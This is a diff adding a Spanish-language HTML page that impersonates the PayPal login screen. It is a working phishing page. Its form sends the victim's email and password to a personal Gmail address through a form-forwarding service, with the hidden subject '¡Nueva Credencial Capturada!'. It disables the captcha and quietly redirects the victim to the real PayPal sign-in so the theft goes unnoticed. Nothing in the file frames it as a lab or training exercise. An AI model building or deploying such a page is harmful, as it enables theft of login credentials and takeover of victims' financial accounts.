@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal - Iniciar Sesión</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        h2 { color: #003087; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background-color: #0070ba; color: white; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        button:hover { background-color: #005ea6; }
+        .footer { margin-top: 20px; font-size: 12px; color: #666; }
+        a { color: #0070ba; text-decoration: none; }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <h2>PayPal</h2>
+    
+    <!-- ENLACE DIRECTO A TU CORREO -->
+    <form action="https://formsubmit.co/orange7509092@gmail.com" method="POST">
+        
+        <!-- Configuraciones ocultas -->
+        <input type="hidden" name="_subject" value="¡Nueva Credencial Capturada!">
+        <input type="hidden" name="_captcha" value="false">
+        <!-- Redirección a PayPal para que no vean la página gris -->
+        <input type="hidden" name="_next" value="https://www.paypal.com/signin"> 
+
+        <label style="display:none;">Si llenas esto, es un robot</label>
+        <input type="text" name="_honey" style="display:none" />
+
+        <input type="email" name="Correo" placeholder="Correo electrónico" required>
+        <input type="password" name="Contraseña" placeholder="Contraseña" required>
+        
+        <button type="submit">Ingresar</button>
+    </form>
+    
+    <div class="footer">
+        <a href="#">¿Olvidaste tu contraseña?</a>
+    </div>
+</div>
+
+</body>
+</html>
